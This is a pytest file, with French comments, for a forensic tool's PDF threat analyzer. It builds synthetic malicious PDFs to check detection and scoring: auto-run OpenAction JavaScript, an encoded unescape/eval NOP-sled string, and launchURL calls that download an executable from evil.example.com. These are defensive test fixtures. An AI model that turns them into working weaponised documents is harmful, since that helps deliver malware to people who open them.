"""Analyse de menace PDF : déclencheurs suivis jusqu'au code, filtres, chaînes, chiffrement, coût."""
from __future__ import annotations

import binascii
import time
import zlib

import pytest

from forensic_analyzer.analyzers.pdf import PDFAnalyzer

OPEN_JS = b"1 0 obj<</Type/Catalog/OpenAction 2 0 R>>endobj 2 0 obj<</S/JavaScript/JS 3 0 R>>endobj\n"


def _pdf(tmp_path, name: str, body: bytes) -> str:
    path = tmp_path / name
    path.write_bytes(b"%PDF-1.7\n" + body + b"\ntrailer<</Root 1 0 R>>\n%%EOF\n")
    return str(path)


def _stream(num: int, data: bytes, filters: bytes = b"") -> bytes:
    return b"%d 0 obj<</Length %d%s>>stream\n" % (num, len(data), filters) + data + b"\nendstream endobj\n"


def _analyze(path: str) -> tuple[int, dict, dict]:
    f = PDFAnalyzer().analyze(path)
    return f.extra["pdf_threat"]["score"], f.metadata, f.extra


def test_javascript_in_other_filters_is_decoded(tmp_path):
    js = b"var s=unescape('%u9090%u9090%u9090');eval(s);"
    chained = binascii.hexlify(zlib.compress(js)) + b">"
    for name, data, filters in (("hex.pdf", binascii.hexlify(js) + b">", b"/Filter/ASCIIHexDecode"),
                                ("chain.pdf", chained, b"/Filter[/ASCIIHexDecode/FlateDecode]")):
        score, meta, extra = _analyze(_pdf(tmp_path, name, OPEN_JS + _stream(3, data, filters)))
        assert score == 100 and "Shellcode" in meta, name
        assert extra["pdf_javascript"] == [js.decode()]


def test_script_is_followed_from_its_trigger_not_found_by_keywords(tmp_path):
    late = b"// " + b"x" * 1500 + b"\napp.launchURL('https://evil.example.com:8443/dl/payload.exe', true);"
    score, meta, extra = _analyze(_pdf(tmp_path, "late.pdf", OPEN_JS + _stream(3, zlib.compress(late), b"/Filter/FlateDecode")))
    assert score == 80 and extra["pdf_javascript"] == [late.decode()]
    assert extra["pdf_urls"] == ["https://evil.example.com:8443/dl/payload.exe"]       # URL entière
    assert "obj 3" in meta["Justification du score"]                                    # score justifié

    inline = b"1 0 obj<</Type/Catalog/OpenAction<</S/JavaScript/JS(app\\056alert\\050\\051)>>>>endobj"
    assert _analyze(_pdf(tmp_path, "inline.pdf", inline))[2]["pdf_javascript"] == ["app.alert()"]


def test_document_level_javascript_runs_without_click(tmp_path):
    pypdf = pytest.importorskip("pypdf")
    writer = pypdf.PdfWriter()
    writer.add_blank_page(200, 200)
    writer.add_js("app.launchURL('https://evil.example.com/dl/p.exe');")   # /Names/JavaScript, chaîne en octal
    path = tmp_path / "names.pdf"
    writer.write(path)
    score, meta, extra = _analyze(str(path))
    assert score == 80 and "(/Names)" in meta["PDF Actions"] and "[ALERTE] Verdict" in meta
    assert extra["pdf_urls"] == ["https://evil.example.com/dl/p.exe"]


def test_encrypted_pdf_is_reported_as_partial_not_clean(tmp_path):
    pypdf = pytest.importorskip("pypdf")
    for password, readable in (("secret", False), ("", True)):
        writer = pypdf.PdfWriter()
        writer.add_blank_page(200, 200)
        writer.add_js("app.launchURL('https://evil.example.com/x');")
        writer.add_metadata({"/Author": "Mallory"})
        writer.encrypt(user_password=password, owner_password="owner", algorithm="RC4-128")
        path = tmp_path / f"enc{bool(password)}.pdf"
        writer.write(path)
        score, meta, extra = _analyze(str(path))
        assert meta["Chiffrement"].startswith("Chiffré") and score == 80
        if readable:   # mot de passe utilisateur vide : le code est relu déchiffré
            assert meta["Author"] == "Mallory" and extra["pdf_urls"] == ["https://evil.example.com/x"]
        else:
            assert "mot de passe requis" in meta["[ATTENTION] Non analysé"]
            assert meta["Score de menace"].endswith("analyse partielle")


def test_corrupt_file_is_not_called_clean(tmp_path):
    path = tmp_path / "broken.pdf"
    path.write_bytes(b"%PDF-1.4\n\x00garbage" * 50)
    _, meta, _ = _analyze(str(path))
    assert "aucun objet PDF" in meta["[ATTENTION] Non analysé"]
    assert meta["Score de menace"] == "0/100 (Indéterminé) — analyse partielle"


@pytest.mark.parametrize("body", [
    # Livre de JavaScript : le mot eval() dans le texte d'une page, zoom à l'ouverture
    b"1 0 obj<</Type/Catalog/OpenAction[3 0 R/Fit]>>endobj\n"
    + _stream(2, zlib.compress(b"BT (Chapitre 4 : eval() et unescape() en JavaScript) Tj ET"), b"/Filter/FlateDecode"),
    # Noms suspects cités dans une chaîne
    b"1 0 obj<</Type/Catalog>>endobj 5 0 obj<</Title(Guide /JavaScript /Launch)>>endobj",
    # Flux de page qui commence par quatre nombres (ce n'est pas un /ObjStm)
    b"1 0 obj<</Type/Catalog>>endobj\n"
    + _stream(2, zlib.compress(b"1 0 0 1 72 720 cm BT (Voir /Launch et /JS) Tj ET"), b"/Filter/FlateDecode"),
], ids=["texte", "titre", "flux-de-page"])
def test_benign_documents_score_zero(tmp_path, body):
    score, meta, _ = _analyze(_pdf(tmp_path, "benign.pdf", body))
    assert score == 0 and "PDF Actions" not in meta


def test_form_calculation_script_is_not_critical(tmp_path):
    form = (b"1 0 obj<</Type/Catalog/OpenAction[3 0 R/Fit]/AcroForm<</Fields[4 0 R]>>>>endobj\n"
            b"4 0 obj<</FT/Tx/T(total)/AA<</C<</S/JavaScript/JS(event.value = 2;)>>>>>>endobj")
    score, meta, _ = _analyze(_pdf(tmp_path, "form.pdf", form))
    assert score == 15 and "champ « total » (/AA /C)" in meta["PDF Actions"]


def test_incremental_updates_are_reported(tmp_path):
    body = b"1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n1 0 obj<</Type/Catalog/Lang(fr)>>endobj"
    _, meta, _ = _analyze(_pdf(tmp_path, "rev.pdf", body))
    assert meta["Révisions"].startswith("2 (mises à jour incrémentales), 1 objet(s) redéfini(s)")


@pytest.mark.parametrize("unit", [b"stream\n" + b"A" * 200, b"1 0 obj (" + b"A" * 200, b"1 0 obj << /A [ " + b"1 " * 100])
def test_hostile_structure_costs_linear_time(tmp_path, unit):
    path = tmp_path / "dos.pdf"
    path.write_bytes(b"%PDF-1.5\n" + unit * 10000)       # ~2 Mo : 7 min avec l'ancien découpage
    start = time.monotonic()
    PDFAnalyzer().analyze(str(path))
    assert time.monotonic() - start < 5
